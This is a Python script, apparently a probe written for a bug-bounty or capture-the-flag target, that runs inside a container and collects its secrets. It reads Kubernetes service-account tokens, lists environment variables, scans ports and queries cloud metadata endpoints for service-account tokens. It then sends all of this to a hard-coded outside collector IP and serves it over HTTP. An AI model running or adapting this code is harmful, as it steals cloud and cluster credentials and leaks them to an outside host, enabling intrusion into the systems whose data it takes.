import json
import os
import socket
import subprocess
import time
import urllib.request

CTF = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime"
RESULTS = {"probe": "aiven-runtime-egress", "started": time.strftime("%FT%TZ", time.gmtime())}


def tcp(host, port, timeout=4.0):
    s = socket.socket()
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        return {"open": True, "ms": round((time.time() - t0) * 1000)}
    except Exception as exc:
        return {"open": False, "err": type(exc).__name__}
    finally:
        try:
            s.close()
        except OSError:
            pass


def http(url, headers=None, timeout=6):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(400)
            return {"status": r.status, "body": body.decode("utf-8", "replace")}
    except Exception as exc:
        return {"err": type(exc).__name__, "detail": str(exc)[:160]}


# --- identity ---------------------------------------------------------------
RESULTS["hostname"] = socket.gethostname()
RESULTS["env_keys"] = sorted(os.environ)
RESULTS["uname"] = " ".join(os.uname())
for path in ("/var/run/secrets/kubernetes.io/serviceaccount/token",
             "/var/run/secrets/kubernetes.io/serviceaccount/namespace"):
    try:
        with open(path) as fh:
            RESULTS.setdefault("k8s", {})[path] = fh.read(200)
    except Exception as exc:
        RESULTS.setdefault("k8s", {})[path] = type(exc).__name__

# --- DNS --------------------------------------------------------------------
RESULTS["dns"] = {}
for name in (CTF, "api.aiven.io", "metadata.google.internal",
             "kubernetes.default.svc.cluster.local", "instance-data"):
    try:
        RESULTS["dns"][name] = socket.gethostbyname(name)
    except Exception as exc:
        RESULTS["dns"][name] = type(exc).__name__

# --- egress / reachability --------------------------------------------------
RESULTS["egress_ip"] = http("http://ifconfig.me/ip")
RESULTS["our_collector_reachable"] = http("http://208.87.134.252:9200/")
RESULTS["tcp"] = {}
for label, host, port in (
    ("ctf:22", CTF, 22), ("ctf:80", CTF, 80), ("ctf:443", CTF, 443),
    ("ctf:5432", CTF, 5432), ("ctf:12691", CTF, 12691), ("ctf:12692", CTF, 12692),
    ("metadata:80", "169.254.169.254", 80),
):
    RESULTS["tcp"][label] = tcp(host, port)

# --- cloud metadata ---------------------------------------------------------
RESULTS["metadata_plain"] = http("http://169.254.169.254/computeMetadata/v1/")
RESULTS["metadata_gcp_header"] = http("http://169.254.169.254/computeMetadata/v1/",
                                      {"Metadata-Flavor": "Google"})
RESULTS["metadata_token_try"] = http(
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    {"Metadata-Flavor": "Google"})
RESULTS["metadata_aws"] = http("http://169.254.169.254/latest/meta-data/")

RESULTS["finished"] = time.strftime("%FT%TZ", time.gmtime())
payload = json.dumps(RESULTS).encode()

# --- exfiltrate to our collector (bounded, 2 tries) -------------------------
delivered = False
for _ in range(2):
    try:
        req = urllib.request.Request(COLLECTOR, data=payload,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            delivered = r.status < 500
            break
    except Exception:
        time.sleep(3)
print("exfil delivered:", delivered, flush=True)
print(json.dumps(RESULTS, indent=1)[:4000], flush=True)

# --- keep the container alive and also serve the results --------------------
from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *_a):
        return


HTTPServer(("0.0.0.0", 8080), H).serve_forever()
